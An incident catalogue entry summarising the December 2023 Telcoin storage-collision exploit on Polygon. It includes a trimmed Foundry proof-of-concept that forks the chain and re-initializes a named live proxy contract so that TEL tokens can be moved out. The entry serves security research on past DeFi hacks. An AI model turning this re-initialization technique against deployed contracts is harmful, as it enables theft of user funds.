# [?] Telcoin - Storage Collision

## Summary
Severity: Unknown
Chain: Polygon
Component: Telcoin
Published: 2023-12-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/Telcoin_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~1,24M
References:
- https://blocksec.com/phalcon/blog/telcoin-security-incident-in-depth-analysis
- https://hacked.slowmist.io/?c=&page=2

```solidity
contract ContractTest is Test {
    // CloneableProxy#1 created and 'initialized' at tx:
    // https://app.blocksec.com/explorer/tx/polygon/0x1a31cb6f417d30fe8769328b3412bfb0d70247a82009ef28dfab5730c82acd05
    ICloneableProxy private constant CloneableProxy = ICloneableProxy(0x56BCADff30680EBB540a84D75c182A5dC61981C0);
    IERC20 private constant TEL = IERC20(0xdF7837DE1F2Fa4631D716CF2502f8b230F1dcc32);

    function setUp() public {
        vm.createSelectFork("polygon", 51_546_495);
        vm.label(address(CloneableProxy), "CloneableProxy#1");
        vm.label(address(TEL), "TEL");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker TEL balance before exploit", TEL.balanceOf(address(this)), TEL.decimals());
        bytes32 cloneableProxyPackedSlot0 = vm.load(address(CloneableProxy), bytes32(uint256(0)));
        console.log("----------------------------------------------------------------");
        emit log_named_bytes32(
            "CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization",
            cloneableProxyPackedSlot0
        );
        console.log("----------------------------------------------------------------");
        console.log(
            "CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s",
            uint8(cloneableProxyPackedSlot0[30]),
            uint8(cloneableProxyPackedSlot0[31])
        );
        console.log("----------------------------------------------------------------");
        console.log("---Exploit Time---");

        bytes memory data = abi.encodePacked(this.transferTELFromCloneableProxy.selector);
        CloneableProxy.initialize(address(this), data);

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/Telcoin_exp.sol_
